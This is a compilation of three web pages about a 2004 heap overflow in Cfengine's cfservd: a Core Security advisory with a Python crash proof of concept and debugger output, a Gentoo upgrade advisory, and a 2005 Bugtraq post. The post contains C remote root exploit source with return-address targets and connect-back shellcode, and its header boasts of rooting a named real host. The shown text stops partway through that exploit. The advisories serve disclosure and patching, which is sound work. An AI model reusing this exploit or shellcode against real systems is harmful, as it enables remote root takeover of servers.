=== Content from marc.info_de15fae8_20250125_135916.html ===

```
[[prev in list](?l=bugtraq&m=109208338827279&w=2)] [[next in list](?l=bugtraq&m=109209217923343&w=2)] [prev in thread] [[next in thread](?l=pen-test&m=109209191427256&w=2)]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    [CORE-2004-0714: Cfengine RSA Authentication Heap Corruption](?t=109208398200005&r=1&w=2)
From:       [CORE Security Technologies Advisories <advisories () coresecurity ! com>](?a=104812137100001&r=1&w=2)
Date:       [2004-08-09 20:32:25](?l=bugtraq&r=1&w=2&b=200408)
Message-ID: [4117DF59.3020405 () coresecurity ! com](?i=4117DF59.3020405%20()%20coresecurity%20!%20com)
[Download RAW [message](?l=bugtraq&m=109208394910086&q=mbox) or [body](?l=bugtraq&m=109208394910086&q=raw)]

                 Core Security Technologies Advisory
                     <http://www.coresecurity.com>

             Cfengine RSA Authentication Heap Corruption

Date Published: 2004-08-09

Last Update: 2004-08-09

Advisory ID: CORE-2004-0714

Bugtraq ID: None currently assigned.

CVE Name: None currently assigned.

Title: Cfengine RSA Authentication Heap Corruption

Class: Input validation error
       Boundary error condition (Buffer Overflow)

Remotely Exploitable: Yes

Locally Exploitable: Yes

Advisory URL:
 <http://www.coresecurity.com/common/showdoc.php?idx=387&idxseccion=10>

Vendors contacted:
- Mark Burgess, author of Cfengine
   . Core Notification: 2004-07-26
   . Notification acknowledged by Mark Burgess: 2004-07-27
   . Fixed version (2.1.8) released: 2004-08-03

Release Mode: COORDINATED RELEASE

*Vulnerability Description:*

 Cfengine, the configuration engine, is a very high level language for
 simplifying the task of administrating and configuring large numbers
 of workstations.

 Cfengine is an autonomous agent and a middle to high level policy
 language for building expert systems which administrate and configure
 large computer networks. Cfengine uses the idea of classes and a
 primitive intelligence to define and automate the configuration and
 maintenance of system state, for small to huge configurations.
 Cfengine is designed to be a part of a computer immune system, and can
 be thought of as a gaming agent. It is ideal for cluster management
 and has been adopted for use all over the world in small and huge
 organizations alike.

 Two vulnerabilities were found in cfservd, a daemon which acts as both
 a file server and a remote cfagent executor. This daemon authenticates
 requests from the network and processes them. If exploited, the first
 vulnerability allows an attacker to execute arbitrary code with those
 privileges of root. The second vulnerability allows an attacker to
 crash the server, denying service to further requests.

 Cfservd uses an IP based access control (AllowConnectionsFrom) which
 must be passed before the vulnerabilities can be exploited. The level
 of risk thus depends on how this access control is configured.

*Vulnerable Packages:*

 These vulnerabilities are present in versions 2.0.0 to 2.1.7p1 of
 cfservd.

*Solution/Vendor Information/Workaround:*

 Mark Burgess, the author of cfengine, would like to thank the Core
 Security team for their courteous and expert help in identifying and
 fixing the problem.
 Release 2.1.8 which fixes these vulnerabilities is available from
 <http://www.cfengine.org>.

*Credits:*

 These vulnerabilities were found by Juan Pablo Martinez Kuhn from
 Core Security Technologies. We wish to thank Mark Burgess for
 his quick response to this issue.

*Technical Description - Exploit/Concept Code:*

 A] Remote code execution vulnerability

 The AuthenticationDialogue() function is responsible for handling
 SAUTH commands and performing RSA authentication and key agreement.
 This is the vulnerable code:

----------------------------------------------------------------------
int AuthenticationDialogue(struct cfd_connection *conn,char *recvbuffer)

{ char in[CF_BUFSIZE],*out, *decrypted_nonce;
  BIGNUM *counter_challenge = NULL;
  unsigned char digest[EVP_MAX_MD_SIZE+1];
  unsigned int crypt_len, nonce_len = 0,len = 0, encrypted_len, keylen;
  char sauth[[10]](#10), iscrypt ='n';
  unsigned long err;
  RSA *newkey;

if (PRIVKEY == NULL || PUBKEY == NULL)
   {
   CfLog(cferror,"No public/private key pair exists, create one with
cfkey\n","");
   return false;
   }

/* proposition C1 */
/* Opening string is a challenge from the client (some agent) */

sscanf(recvbuffer,"%s %c %d %d",sauth,&iscrypt,&crypt_len,&nonce_len);  [[0]](#0)

if ((strcmp(sauth,"SAUTH") != 0) || (nonce_len == 0) || (crypt_len ==
0))  [[1]](#1)
   {
   CfLog(cfinform,"Protocol error in RSA authentation from IP
%s\n",conn->hostname);
   return false;
   }

Debug("Challenge encryption = %c, nonce = %d, buf =
%d\n",iscrypt,nonce_len,crypt_len);

#if defined HAVE_PTHREAD_H && (defined HAVE_LIBPTHREAD || defined
BUILDTIN_GCC_THREAD)
 if (pthread_mutex_lock(&MUTEX_SYSCALL) != 0)
    {
    CfLog(cferror,"pthread_mutex_lock failed","lock");
    }
#endif

if ((decrypted_nonce = malloc(crypt_len)) == NULL)  [[2]](#2)
   {
   FatalError("memory failure");
   }

if (iscrypt == 'y')
   {
   if
(RSA_private_decrypt(crypt_len,recvbuffer+CF_RSA_PROTO_OFFSET,decrypted_nonce,PRIVKEY,RSA_PKCS1_PADDING) \
 <= 0)
      {
      err = ERR_get_error();
      snprintf(conn->output,CF_BUFSIZE,"Private decrypt failed =
%s\n",ERR_reason_error_string(err));
      CfLog(cferror,conn->output,"");
      free(decrypted_nonce);

#if defined HAVE_PTHREAD_H && (defined HAVE_LIBPTHREAD || defined
BUILDTIN_GCC_THREAD)
      if (pthread_mutex_unlock(&MUTEX_SYSCALL) != 0)
         {
         CfLog(cferror,"pthread_mutex_unlock failed","lock");
         }
#endif
      return false;
      }
   }
 else
    {
    memcpy(decrypted_nonce,recvbuffer+CF_RSA_PROTO_OFFSET,nonce_len);  [[3]](#3)
[...]
----------------------------------------------------------------------

 Notes about this code extract:
 [[0]](#0) iscrypt, crypt_len and nonce_len are retrieved from network
     received data using the sscanf() function.
 [[1]](#1) crypt_len and nonce_len are checked for not being zero, this is the
     only check performed on the received integers.
 [[2]](#2) A crypt_len sized decrypted_nonce buffer is allocated in the heap
 [[3]](#3) If iscrypt different from 'y' was provided, nonce_len bytes are
     copied from the supplied buffer to the decrypted_nonce buffer.

 So, it is possible to write an almost arbitrary amount of arbitrary
 bytes after the end of a heap allocated buffer. Exploitation of this
 vulnerability is made easier because:
 a) the attacker controls the size of the buffer to be overflowed in [[2]](#2)
 b) the attacker is able to overflow the buffer with the desired amount
    of bytes
 c) the bytes the attacker uses to overflow the buffer are not limited
    in any way.

 The following proof of concept code reproduces the bug in a
 cfengine 2.1.7p1 default configuration:

----------------------------------------------------------------------
import struct
import socket
import time

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.1.1',5308)

            # CAUTH command
p = 'k'            # status
p += '0000023'         # len
p += 'CAUTH '         # command
p += 'HARE KRISHNA HARE'
print 'sending CAUTH command...'
s.send(p)
            # SAUTH command
p = 'k'            # status
p += '0003000'        # len
p += 'SAUTH '        # command
p += 'n'        # iscrypt
p += '00000010 '     # crypt_len
p += '00001000'        # nonce_len
p += 'X' * 3000
print 'sending SAUTH command...'
s.send(p)

a = s.recv(4096)
print a
----------------------------------------------------------------------

 This is the debug output from cfservd being exploited:

----------------------------------------------------------------------
[root@localhost sbin]# ./cfservd -vvv -d2
cfservd: Debug mode: running in foreground
AddClassToHeap(any)
AddClassToHeap(cfengine_2_1_7p1)
Appending [cfengine_2_1_7p1]
AddClassToHeap(cfengine_2_1)
Appending [cfengine_2_1]
AddClassToHeap(cfengine_2)
Appending [cfengine_2]
This appears to be a redhat system.
AddClassToHeap(redhat)
Appending [redhat]
Looking for redhat linux info in "Red Hat Linux release 9 (Shrike)
"
AddClassToHeap(redhat)
AddClassToHeap(redhat_9)
Appending [redhat_9]
GetNameInfo()
AddClassToHeap(linux)
Appending [linux]
AddClassToHeap(localhost_localdomain)
Appending [localhost_localdomain]
AddClassToHeap(localhost_localdomain)
AddClassToHeap(localdomain)
Appending [localdomain]
Truncating fully qualified hostname localhost.localdomain to localhost
AddClassToHeap(localhost)
Appending [localhost]
GNU Cfengine server daemon -
2.1.7p1
Free Software Foundation 1994-
Donated by Mark Burgess, Faculty of Engineering,
Oslo University College, 0254 Oslo, Norway

----------------------------------------------------------------------

Host name is: localhost.localdomain
Operating System Type is linux
Operating System Release is 2.4.20-8smp
Architecture = i686

Using internal soft-class linux for host linux

The time is now Wed Jul 21 17:19:38 2004

----------------------------------------------------------------------

AddClassToHeap(32_bit)
Appending [32_bit]
Additional hard class defined as: 32_bit
AddClassToHeap(linux_2_4_20_8smp)
Appending [linux_2_4_20_8smp]
AddClassToHeap(i686)
Appending [i686]
Additional hard class defined as: linux_2_4_20_8smp
AddClassToHeap(linux_i686)
Appending [linux_i686]
Additional hard class defined as: linux_i686
AddClassToHeap(linux_i686_2_4_20_8smp)
Appending [linux_i686_2_4_20_8smp]
Additional hard class defined as: linux_i686_2_4_20_8smp
AddClassToHeap(linux_i686_2_4_20_8smp__1_SMP_Thu_Mar_13_17_45_54_EST_2003)
Appending [linux_i686_2_4_20_8smp__1_SMP_Thu_Mar_13_17_45_54_EST_2003]
Additional hard class defined as:
linux_i686_2_4_20_8smp__1_SMP_Thu_Mar_13_17_45_54_EST_2003
AddClassToHeap(compiled_on_linux_gnu)
Appending [compiled_on_linux_gnu]

GNU autoconf class from compile time: compiled_on_linux_gnu

GetInterfaceInfo()
Interface 1: lo
AddClassToHeap(net_iface_lo)
Appending [net_iface_lo]
Interface 2: eth0
AddClassToHeap(net_iface_eth0)
Appending [net_iface_eth0]
Host information for 192.168.1.1 not found
Trying to locate my IPv6 address
cfpopen(/sbin/ifconfig -a)
Directory for /var/cfengine/test exists. Okay
CheckWorkDirectories()
Directory for /var/cfengine/test exists. Okay
Directory for /var/cfengine/state/test exists. Okay
Checking integrity of the state database
Checking integrity of the module directory
Checking integrity of the input data for RPC
Checking integrity of the output data for RPC
Checking integrity of the PKI directory
Making sure that locks are private...
RandomSeed() work directory is /var/cfengine
Looking for a source of entropy in /var/cfengine/randseed
Loaded /var/cfengine/ppkeys/localhost.priv
Loaded /var/cfengine/ppkeys/localhost.pub
New Parser Object::(BEGIN PARSING /var/cfengine/inputs/cfservd.conf)
Looking for an input file /var/cfengine/inputs/cfservd.conf
(No file /var/cfengine/inputs/cfservd.conf)
(END OF PARSING /var/cfengine/inputs/cfservd.conf)
Finished with /var/cfengine/inputs/cfservd.conf
Delete Parser Object::cfservd: cfservd Multithreaded version
GetMacroValue(server,CheckIdent)
GetMacroValue(server,DenyBadClocks)
GetMacroValue(server,LogAllConnections)
GetMacroValue(server,ChecksumDatabase)
GetMacroValue(server,cfrunCommand)
GetMacroValue(server,MaxConnections)
MaxConnections = 10
GetMacroValue(server,ChecksumUpdates)
GetMacroValue(server,BindToInterface)

Defined Classes = ( any cfengine_2_1_7p1 cfengine_2_1 cfengine_2 redhat
redhat_9 linux localhost_localdomain localdomain localhost 32_bit
linux_2_4_20_8smp i686 linux_i686 linux_i686_2_4_20_8smp
linux_i686_2_4_20_8smp__1_SMP_Thu_Mar_13_17_45_54_EST_2003
compiled_on_linux_gnu net_iface_lo net_iface_eth0 )

Negated Classes = ( )

Installable classes = ( )
ACCESS GRANTED ----------------------:

ACCESS DENIAL ------------------------ :

Host IPs allowed connection access :

Host IPs denied connection access :

Host IPs allowed multiple connection access :

Host IPs from whom we shall accept public keys on trust :

Host IPs from NAT which we don't verify :

Dynamical Host IPs (e.g. DHCP) whose bindings could vary over time :

IPV4 address
sockaddr_ntop(0.0.0.0)
Bound to address 0.0.0.0 on linux=6
Listening for connections ...
cfservd: Input file /var/cfengine/inputs/cfservd.conf missing or busy..
cfservd: /var/cfengine/inputs/cfservd.conf: No such file or directory
IPV4 address
sockaddr_ntop(192.168.1.2)
Obtained IP address of 192.168.1.2 on socket 5 from accept

FuzzyItemIn(LIST,192.168.1.2)
Purging Old Connections...
Done purging

FuzzyItemIn(LIST,192.168.1.2)
Prepending [192.168.1.2]
*** New socket [[5]](#5)
New connection...(from 192.168.1.2/5)
Spawning new thread...
RecvSocketStream(8)
    (Concatenated 8 from stream)
Transaction Receive [k0000023][]
RecvSocketStream(23)
    (Concatenated 23 from stream)
Received: [CAUTH HARE KRISHNA HARE] on socket 5
Connecting host identifies itself as HARE KRISHNA HARE
(ipstring=[HARE],fqname=[KRISHNA],username=[HARE],socket=[192.168.1.2])
cfservd: Allowing HARE to connect without (re)checking ID
Non-verified Host ID is krishna (Using skipverify)
Non-verified User ID seems to be HARE (Using skipverify)
username wascfservd: Unable to lookup hostname (krishna) or cfengine
service: Temporary failure in name resolution
Updating last-seen time for krishna
RecvSocketStream(8)
    (Concatenated 8 from stream)
Transaction Receive [k0003000][]
RecvSocketStream(3000)
    (Concatenated 3000 from stream)
Received: [SAUTH n00000010
00001000XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX \
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX \
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX \
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX \
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX \
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX \
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX \
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX \
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX \
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX \
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX \
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX \
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX \
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX \
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX \
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX \
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX \
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX \
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX \
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX \
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX \
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX \
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX \
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX \
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX \
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX \
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX \
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX \
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX \
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX \
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX \
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX \
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX \
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX] \
 on socket 5
Challenge encryption = n, nonce = 1000, buf = 10
ChecksumString(m)
RecvSocketStream(8)
    (Concatenated 8 from stream)
Transaction Receive [XXXXXXXX][]
RecvSocketStream(0)
cfservd: Protocol error 2 in RSA authentation from IP ?s
Segmentation fault
[root@localhost sbin]#
----------------------------------------------------------------------

 And this is gdb's output when making the server crash with the sample
 values:

----------------------------------------------------------------------
Continuing.
[New Thread 1077705920 (LWP 15271)]

Program received signal SIGSEGV, Segmentation fault.
[Switching to Thread 1077705920 (LWP 15271)]
0x4207493f in malloc_consolidate () from /lib/tls/libc.so.6
(gdb) bt
#0  0x4207493f in malloc_consolidate () from /lib/tls/libc.so.6
#1  0x42073f99 in _int_malloc () from /lib/tls/libc.so.6
#2  0x4207335b in malloc () from /lib/tls/libc.so.6
#3  0x42069667 in open_memstream () from /lib/tls/libc.so.6
#4  0x420da38b in vsyslog () from /lib/tls/libc.so.6
#5  0x420da2ef in syslog () from /lib/tls/libc.so.6
#6  0x08076a9a in CfLog (level=cfinform, string=0x42131300 "",
    errstr=0x42131300 "") at log.c:151
#7  0x0804e7d6 in AuthenticationDialogue (conn=0x8118d10,
    recvbuffer=0x403c677c "SAUTH n00000010 00001000", 'X' <repeats 176
times>...) at cfservd.c:2153
#8  0x0804ce7e in BusyWithConnection (conn=0x8118d10) at cfservd.c:1187
#9  0x0804c5d1 in HandleConnection (conn=0x8118d10) at cfservd.c:1070
#10 0x401c82b6 in start_thread () from /lib/tls/libpthread.so.0
(gdb) x/i $pc
0x4207493f <malloc_consolidate+159>:    testb  $0x1,0x4(%edx,%edi,1)
(gdb) x/x $edx
0x58585858:     Cannot access memory at address 0x58585858
(gdb) x/x $edi
0x8118780:      0x58585858
(gdb)
----------------------------------------------------------------------

 B] Denial of service vulnerability

 The following code, also in AuthenticationDialogue(), is vulnerable to
 a remote denial of service attack:

----------------------------------------------------------------------
[...]
/* proposition C5 */
memset(in,0,CF_BUFSIZE);
keylen = ReceiveTransaction(conn->sd_reply,in,NULL);         [[0]](#0)

#if defined HAVE_PTHREAD_H && (defined HAVE_LIBPTHREAD || defined
BUILDTIN_GCC_THREAD)
if (pthread_mutex_lock(&MUTEX_SYSCALL) != 0)
   {
   CfLog(cferror,"pthread_mutex_lock failed","lock");
   }
#endif

conn->session_key = malloc(keylen);                [[1]](#1)

#if defined HAVE_PTHREAD_H && (defined HAVE_LIBPTHREAD || defined
BUILDTIN_GCC_THREAD)
if (pthread_mutex_unlock(&MUTEX_SYSCALL) != 0)
   {
   CfLog(cferror,"pthread_mutex_unlock failed","lock");
   }
#endif

memcpy(conn->session_key,in,keylen);                [[2]](#2)
Debug("Got a session key...\n");
[...]
----------------------------------------------------------------------

 The return value of ReceiveTransaction() is not checked [[0]](#0). Then,
 this value is used to call malloc() and the returned value is not
 checked either [[1]](#1). Finally, in [[2]](#2) the pointer returned is used
 as memcpy's destination parameter.
 Usually, the return value of ReceiveTransaction() is an integer, which
 is checked not to be greater than a certain maximum size within cfengine
 network/protocol handling code. However, it is possible to make the
 function return -1, faking a cfengine version 1 protocol packet.
 This will make malloc(-1) return NULL, and memcpy(0,in,-1) will make
 the server crash.

*About Core Security Technologies*

 Core Security Technologies develops strategic security solutions for
 Fortune 1000 corporations, government agencies and military
 organizations. The company offers information security software and
 services designed to assess risk and protect and manage information
 assets.
 Headquartered in Boston, MA, Core Security Technologies can be reached
 at 617-399-6980 or on the Web at <http://www.coresecurity.com>.

 To learn more about CORE IMPACT, the first comprehensive penetration
 testing product, visit:
 <http://www.coresecurity.com/products/coreimpact>

*DISCLAIMER:*

 The contents of this advisory are copyright (c) 2004 CORE Security
 Technologies and may be distributed freely provided that no fee is
 charged for this distribution and proper credit is given.

$Id: cfengine-advisory.txt,v 1.10 2004/08/09 18:34:14 carlos Exp $

[[prev in list](?l=bugtraq&m=109208338827279&w=2)] [[next in list](?l=bugtraq&m=109209217923343&w=2)] [prev in thread] [[next in thread](?l=pen-test&m=109209191427256&w=2)]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)



=== Content from security.gentoo.org_57dcbdde_20250125_135919.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# Cfengine: RSA Authentication Heap Corruption — GLSA **200408-08**

Cfengine is vulnerable to a remote root exploit from clients in
AllowConnectionsFrom.

### Affected packages

| Package | **net-misc/cfengine** on all architectures |
| --- | --- |
| Affected versions | <= **2.1.7** |
| Unaffected versions | >= **2.1.8**< **2.0.0** |

### Background

Cfengine is an agent/software robot and a high level policy language
for building expert systems to administrate and configure large
computer networks.

### Description

Two vulnerabilities have been found in cfservd. One is a buffer
overflow in the AuthenticationDialogue function and the other is a
failure to check the proper return value of the ReceiveTransaction
function.

### Impact

An attacker could use the buffer overflow to execute arbitrary code
with the permissions of the user running cfservd, which is usually the
root user. However, before such an attack could be mounted, the
IP-based ACL would have to be bypassed. With the second vulnerability,
an attacker could cause a denial of service attack.

### Workaround

There is no known workaround at this time. All users are encouraged to
upgrade to the latest available version of Cfengine. (It should be
noted that disabling cfservd will work around this particular problem.
However, in many cases, doing so will cripple your Cfengine setup.
Upgrading is strongly recommended.)

### Resolution

All Cfengine users should upgrade to the latest version:

```
 # emerge sync

 # emerge -pv ">=net-misc/cfengine-2.1.8"
 # emerge ">=net-misc/cfengine-2.1.8"
```
### References

* [Corelabs Advisory](https://www.coresecurity.com/common/showdoc.php?idx=387&idxseccion=10)
* [CVE-2004-1701](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-1701)
* [CVE-2004-1702](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-1702)

**Release date**

August 10, 2004

**Latest revision**

May 22, 2006: 05

**Severity**

high

**Exploitable**

remote

**Bugzilla entries**

* [59895](https://bugs.gentoo.org/show_bug.cgi?id=59895)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**



=== Content from marc.info_82032805_20250125_135917.html ===

```
[[prev in list](?l=bugtraq&m=110886857016418&w=2)] [[next in list](?l=bugtraq&m=110886869922397&w=2)] [prev in thread] [[next in thread](?l=cfengine-help&m=110896482308904&w=2)]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    [cfengine rsa heap remote exploit:   part of PTjob project](?t=110886677900002&r=1&w=2)
From:       [yan feng <jsk () ph4nt0m ! net>](?a=105769447700002&r=1&w=2)
Date:       [2005-02-19 13:16:50](?l=bugtraq&r=1&w=2&b=200502)
Message-ID: [20050219131650.1968.qmail () www ! securityfocus ! com](?i=20050219131650.1968.qmail%20()%20www%20!%20securityfocus%20!%20com)
[Download RAW [message](?l=bugtraq&m=110886670528775&q=mbox) or [body](?l=bugtraq&m=110886670528775&q=raw)]

/*           _ ________            _____                        ______
 *
 * cfengine rsa heap remote exploit  part of PTjob project / \  / "fuck mm"
 * by jsk:exworm(<http://exworm.hostrocket.com>)            \/
 * bug found by core
 * yep ta mei dayong ..hehe..so pub it..
 * my home: [www.ph4nt0m.org](http://www.ph4nt0m.org)
 * GT: emm.oyxin.seal.ava.haggis.b_root.more..
 * No girl No money  No jop...
 * bash-2.05b# ./cf_0day -t 1 -h 192.168.31.23
 * cfengine rsa heap remote exploit ....s
 * --------------------------------------------------(need money.to..fk..girl..)
 * [+] lisntener...
 * [+] Connected, sending code...
 * [+] Ret: 0x0819f03e
 * [+] Got: 0x0811a590
 * [+] ownedbyOseen!
 * -----------------------------------------------------------
 * Linux ns2.autson.com 2.4.18-3 #1 Thu Apr 18 07:37:53 EDT 2002 i686 unknown
 * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10
 *(wheel)
 *
 *
 */

#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <netdb.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <getopt.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <errno.h>
#include <linux/sockios.h>

#define BUF 1024

struct {
        char *distro;
        char *type;
        unsigned long ret;
        unsigned long got;

} targets[] = { /*got is free of rsafree() ,get it by yourself to own more machine ;) \
*/  { "Redhat 7.3 ", "cfengine 2.1.7p1  ",0x0819f03e , 0x0811a590 },
        { "redhat 9.0  ", "cfengine 2.1.7p1", **********, ********** },  ( hehe:use \
fast-bin tips)  { "Redhat  7.2  ", "cfengine 2.17p1 ", 0x080d1c78, 0x0806d0e3 },
        { "Redhat 7.1     ", "cfengine 2.17p1", 0x080d11e0, 0x082bc090 },
        { "Crash          ", "(All platforms)  ", 0x42424242, 0x41414141 },
};
char linux_connect_back[] =  /* connect back 45295 */
 "\x31\xc0\x31\xdb\x31\xc9\x51\xb1"
        "\x06\x51\xb1\x01\x51\xb1\x02\x51"
        "\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
        "\x89\xc2\x31\xc0\x31\xc9\x51\x51"
        "\x68\x41\x42\x43\x44\x66\x68\xb0"
        "\xef\xb1\x02\x66\x51\x89\xe7\xb3"
        "\x10\x53\x57\x52\x89\xe1\xb3\x03"
        "\xb0\x66\xcd\x80\x31\xc9\x39\xc1"
        "\x74\x06\x31\xc0\xb0\x01\xcd\x80"
        "\x31\xc0\xb0\x3f\x89\xd3\xcd\x80"
        "\x31\xc0\xb0\x3f\x89\xd3\xb1\x01"
        "\xcd\x80\x31\xc0\xb0\x3f\x89\xd3"
        "\xb1\x02\xcd\x80\x31\xc0\x31\xd2"
        "\x50\x68\x6e\x2f\x73\x68\x68\x2f"
        "\x2f\x62\x69\x89\xe3\x50\x53\x89"
        "\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0"
        "\x01\xcd\x80";
int sock;
void usage();
void shell();

void
usage(char *prog)
{

	 fprintf(stderr,"Usage: %s -t [-pah]\n",prog);
        fprintf(stderr,"-t version       Linux version.\n");
        fprintf(stderr,"-h target       The host to attack.\n");
	 fprintf(stderr,"-a password     Default password is \"sorry no password. \".\n");
        fprintf(stderr,"-p port         Default port is 5803.\n\n");
}

int
openhost(char *host,int port)
{
        struct sockaddr_in addr;
        struct hostent *he;

        he=gethostbyname(host);

        if (he==NULL) return -1;
        sock=socket(AF_INET, SOCK_STREAM, getprotobyname("tcp")->p_proto);
        if (sock==-1) return -1;

        memcpy(&addr.sin_addr, he->h_addr, he->h_length);

        addr.sin_family=AF_INET;
        addr.sin_port=htons(port);

        if(connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == -1)
        sock=-1;
